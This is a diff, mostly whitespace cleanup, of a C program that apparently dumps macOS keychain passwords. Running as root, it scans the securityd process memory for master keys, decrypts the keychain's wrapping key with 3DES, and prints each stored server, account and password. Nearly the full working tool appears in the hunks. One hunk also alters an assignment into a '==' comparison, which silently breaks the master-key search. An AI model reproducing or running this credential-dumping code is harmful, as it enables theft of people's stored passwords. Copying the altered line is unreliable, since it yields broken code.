@@ -49,13 +49,13 @@ void add_master_candidate(char *key) {
     if (!g_master_candidates) {
         g_master_candidates = malloc(MAX_MASTER_CANDIDATES * sizeof(char *));
     }
-    
+
     // Key already known?
     int i;
     for (i = 0; i < g_master_candidates_count; ++i) {
         if (!memcmp(key, g_master_candidates[i], 24)) return;
     }
-    
+
     if (g_master_candidates_count < MAX_MASTER_CANDIDATES) {
         char *new = malloc(24);
         memcpy(new, key, 24);
@@ -69,7 +69,7 @@ void add_master_candidate(char *key) {
 // Enumerates the system's process list to find the PID of securityd.
 int get_securityd_pid() {
     int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
-    
+
     size_t sz;
     sysctl(mib, 4, NULL, &sz, NULL, 0);
 
@@ -85,7 +85,7 @@ int get_securityd_pid() {
             break;
         }
     }
-    
+
     free(procs);
     return pid;
 }
@@ -99,9 +99,9 @@ void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, v
         printf("[-] Could not allocate memory for key search\n");
         exit(1);
     }
-    
+
     size_t read_sz;
-    
+
     kern_return_t r = vm_read_overwrite(task, start, sz, (vm_address_t)buffer, &read_sz);
     if (sz != read_sz) printf("[-] Requested %lu bytes, got %lu bytes\n", sz, read_sz);
 
@@ -109,7 +109,7 @@ void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, v
         int i;
         for (i = 0; i < read_sz - sizeof(unsigned long int); i += 4) {
             unsigned long int *p = (unsigned long int *)(buffer + i);
-            
+
             // Look for an 8-byte size field with value 0x18, followed by an 8-byte
             // pointer to the same memory range we are currently inspecting. Use
             // the value the pointer points to as a candidate master key.
@@ -126,7 +126,7 @@ void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, v
     } else {
         printf("[-] Error (%i) reading task memory @ %p\n", r, (void *)start);
     }
-    
+
     free(buffer);
 }
 
@@ -135,12 +135,12 @@ void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, v
 void search_for_keys_in_process(int pid) {
     mach_port_name_t task;
     task_for_pid(current_task(), pid, &task);
-    
+
     char cmd[128];
     snprintf(cmd, 128, "vmmap %i", pid);
-    
+
     FILE *p = popen(cmd, "r");
-    
+
     char line[512];
     vm_address_t start, stop;
     while (fgets(line, 512, p)) {
@@ -149,7 +149,7 @@ void search_for_keys_in_process(int pid) {
             search_for_keys_in_task_memory(task, start, stop);
         }
     }
-    
+
     pclose(p);
 }
 
@@ -165,14 +165,14 @@ t_credentials *find_or_create_credentials(char *label) {
         g_credentials = malloc(sz);
         memset(g_credentials, 0, sz);
     }
-    
+
     int i;
     for (i = 0; i < g_credentials_count; ++i) {
         if (!memcmp(label, g_credentials[i].label, 20)) {
             return &g_credentials[i];
         }
     }
-    
+
     if (g_credentials_count < MAX_CREDENTIALS) {
         t_credentials *new = &g_credentials[g_credentials_count++];
         memcpy(new->label, label, 20);
@@ -187,12 +187,12 @@ t_credentials *find_or_create_credentials(char *label) {
 size_t check_3des_plaintext_padding(char *plaintext, size_t len) {
     char pad = plaintext[len-1];
     if (pad < 1 || pad > 8) return 0;
-    
+
     int i;
     for (i = 1; i < pad; ++i) {
         if (plaintext[len-1-i] != pad) return 0;
     }
-    
+
     return (size_t)pad;
 }
 
@@ -209,10 +209,10 @@ size_t decrypt_3des(char *in, size_t len, char *out, char *key, char* iv) {
     DES_set_key((C_Block *)ckey1, &ks1);
     DES_set_key((C_Block *)ckey2, &ks2);
     DES_set_key((C_Block *)ckey3, &ks3);
-    
+
     char *padded = malloc(len);
     DES_ede3_cbc_encrypt((unsigned char *)in, (unsigned char *)padded, len, &ks1, &ks2, &ks3, &civ, DES_DECRYPT);
-    
+
     size_t out_len = 0;
     size_t padding = check_3des_plaintext_padding(padded, len);
     if (padding > 0) {
@@ -230,7 +230,7 @@ size_t decrypt_3des(char *in, size_t len, char *out, char *key, char* iv) {
 int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
     char magic[] = "\xfa\xde\x07\x11";
     int offset;
-    
+
     // Instead of parsing the keychain file, just look for the last
     // blob identified by the magic number and assume it is a DbBlob
     for (offset = sz-4; offset >= 0; offset -= 4) {
@@ -241,16 +241,16 @@ int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
         exit(1);
     }
     char *blob = buffer + offset;
-    
+
     char iv[8];
     memcpy(iv, blob + 64, 8);
-    
+
     char key[48];
     int ciphertext_offset = atom32(blob + 8);
     size_t key_len = decrypt_3des(blob + ciphertext_offset, 48, key, master, iv);
-    
+
     if (!key_len) return 0;
-    
+
     memcpy(out, key, 24);
     return 24;
 }
@@ -266,14 +266,14 @@ void dump_key_blob(char *key, char *blob) {
     // The label is actually an attribute after the KeyBlob
     char label[20];
     memcpy(label, blob + blob_len + 8, 20);
-    
+
     if (strncmp(label, "ssgp", 4)) return;
-    
+
     int ciphertext_len = blob_len - ciphertext_offset;
-    
+
     if (ciphertext_len != 48) return;
-    
-    // Decrypt the obfuscation IV layer 
+
+    // Decrypt the obfuscation IV layer
     char tmp[48];
     char obfuscationIv[] = "\x4a\xdd\xa2\x2c\x79\xe8\x21\x05";
     size_t tmp_len = decrypt_3des(blob + ciphertext_offset, 48, tmp, key, obfuscationIv);
@@ -284,11 +284,11 @@ void dump_key_blob(char *key, char *blob) {
     for (i = 0; i < 32; ++i) {
         reverse[31 - i] = tmp[i];
     }
-    
+
     // Decrypt the real IV layer
     tmp_len = decrypt_3des(reverse, 32, tmp, key, iv);
     if (tmp_len != 28) return;
-    
+
     // Discard the first 4 bytes
     t_credentials *cred = find_or_create_credentials(label);
     memcpy(cred->key, tmp + 4, 24);
@@ -299,19 +299,19 @@ void dump_key_blob(char *key, char *blob) {
 void dump_credentials_data(char *record) {
     int record_sz = atom32(record + 0);
     int data_sz = atom32(record + 16);
-    
+
     // No attributes?
     if (record_sz == 24 + data_sz) return;
 
     int first_attribute_offset = atom32(record + 24) & 0xfffffffe;
     int data_offset = first_attribute_offset - data_sz;
     int attribute_count = (data_offset - 24) / 4;
-    
+
     // The correct table (8) has 20 attributes
     if (attribute_count != 20) return;
-    
+
     char *data = record + data_offset;
-    
+
     size_t ciphertext_len = data_sz - 20 - 8;
     if (ciphertext_len < 8) return;
     if (ciphertext_len % 8 != 0) return;
@@ -319,16 +319,16 @@ void dump_credentials_data(char *record) {
     char label[20];
     char iv[8];
     char *ciphertext = malloc(ciphertext_len);
-    
+
     memcpy(label, data + 0, 20);
     memcpy(iv, data + 20, 8);
     memcpy(ciphertext, data + 28, ciphertext_len);
-    
+
     t_credentials *cred = find_or_create_credentials(label);
     memcpy(cred->iv, iv, 8);
     cred->ciphertext = ciphertext;
     cred->ciphertext_len = ciphertext_len;
-    
+
     // Attributes 13 and 15
     int srvr_attribute_offset = atom32(record + 24 + 15*4) & 0xfffffffe;
     int acct_attribute_offset = atom32(record + 24 + 13*4) & 0xfffffffe;
@@ -336,16 +336,16 @@ void dump_credentials_data(char *record) {
     char *acct_attribute = record + acct_attribute_offset;
     int srvr_len = atom32(srvr_attribute + 0);
     int acct_len = atom32(acct_attribute + 0);
-    
+
     if (!srvr_len || !acct_len) return;
-    
+
     char *srvr = malloc(srvr_len + 1);
     char *acct = malloc(acct_len + 1);
     memset(srvr, 0, srvr_len + 1);
     memset(acct, 0, acct_len + 1);
     memcpy(srvr, srvr_attribute + 4, srvr_len);
     memcpy(acct, acct_attribute + 4, acct_len);
-    
+
     cred->server = srvr;
     cred->account = acct;
 }
@@ -359,27 +359,27 @@ void dump_credentials_data(char *record) {
 // credentials data records in table 8.
 void dump_keychain(char *key, char *buffer) {
     int i, j;
-    
+
     if (strncmp(buffer, "kych", 4)) {
         printf("[-] The target file is not a keychain file\n");
         return;
     }
-    
+
     int schema_offset = atom32(buffer + 12);
     char *schema = buffer + schema_offset;
-    
+
     // Traverse each table
     int table_count = atom32(schema + 4);
     for (i = 0; i < table_count; ++i) {
         int table_offset = atom32(schema + 8 + i*4);
         char *table = schema + table_offset;
-        
+
         // Traverse each record
         int record_count = atom32(table + 8);
         for (j = 0; j < record_count; ++j) {
             int record_offset = atom32(table + 28 + j*4);
             char *record = table + record_offset;
-            
+
             // Calculate the start of the data section
             int record_sz = atom32(record + 0);
             int data_sz = atom32(record + 16);
@@ -389,9 +389,9 @@ void dump_keychain(char *key, char *buffer) {
                 data_offset = first_attribute_offset - data_sz;
             }
             char *data = record + data_offset;
-            
+
             int magic = atom32(data + 0);
-            
+
             if (magic == 0xfade0711) {
                 dump_key_blob(key, data);
             } else if (magic == 0x73736770) {
@@ -406,12 +406,12 @@ void dump_keychain(char *key, char *buffer) {
 // key, and ciphertext for the decryption to work.
 void decrypt_credentials() {
     if (!g_credentials) return;
-    
+
     int i;
     for (i = 0; i < g_credentials_count; ++i) {
         t_credentials *cred = &g_credentials[i];
         if (!cred->ciphertext) continue;
-        
+
         char *tmp = malloc(cred->ciphertext_len);
         size_t tmp_len = decrypt_3des(cred->ciphertext, cred->ciphertext_len, tmp, cred->key, cred->iv);
         if (tmp_len) {
@@ -427,7 +427,7 @@ void decrypt_credentials() {
 // after all the data has been dumped and the passwords decrypted.
 void print_credentials() {
     if (!g_credentials) return;
-    
+
     int i;
     for (i = 0; i < g_credentials_count; ++i) {
         t_credentials *cred = &g_credentials[i];
@@ -445,18 +445,18 @@ int main(int argc, char **argv) {
         printf("[-] Could not find the securityd process\n");
         exit(1);
     }
-    
+
     if (geteuid()) {
         printf("[-] No root privileges, please run with sudo\n");
         exit(1);
     }
-    
+
     search_for_keys_in_process(pid);
-    
+
     printf("[*] Found %i master key candidates\n", g_master_candidates_count);
-    
+
     if (!g_master_candidates_count) exit(1);
-    
+
     // Phase 2. Try decrypting the wrapping key with each master key candidate
     // to see which one gives a valid result.
     char filename[512];
@@ -465,20 +465,20 @@ int main(int argc, char **argv) {
     } else {
         sprintf(filename, "%s", argv[1]);
     }
-    
+
     FILE *f = fopen(filename, "rb");
     if (!f) {
         printf("[-] Could not open %s\n", filename);
         exit(1);
     }
-    
+
     fseek(f, 0, SEEK_END);
     size_t sz = ftell(f);
     char *buffer = malloc(sz);
     rewind(f);
     fread(buffer, 1, sz, f);
     fclose(f);
-    
+
     printf("[*] Trying to decrypt wrapping key in %s\n", filename);
 
     char key[24];
@@ -487,7 +487,7 @@ int main(int argc, char **argv) {
         char s_key[24*2+1];
         hex_string(s_key, g_master_candidates[i], 24);
         printf("[*] Trying master key candidate: %s\n", s_key);
-        if (key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz)) {
+        if (key_len == dump_wrapping_key(key, g_master_candidates[i], buffer, sz)) {
             printf("[+] Found master key: %s\n", s_key);
             break;
         }
@@ -500,13 +500,13 @@ int main(int argc, char **argv) {
     char s_key[24*2+1];
     hex_string(s_key, key, 24);
     printf("[+] Found wrapping key: %s\n", s_key);
-    
+
     // Phase 3. Using the wrapping key, dump all credentials from the keychain
     // file into the global credentials list and decrypt everything.
     dump_keychain(key, buffer);
     decrypt_credentials();
     print_credentials();
-    
+
     free(buffer);
     return 0;
 }
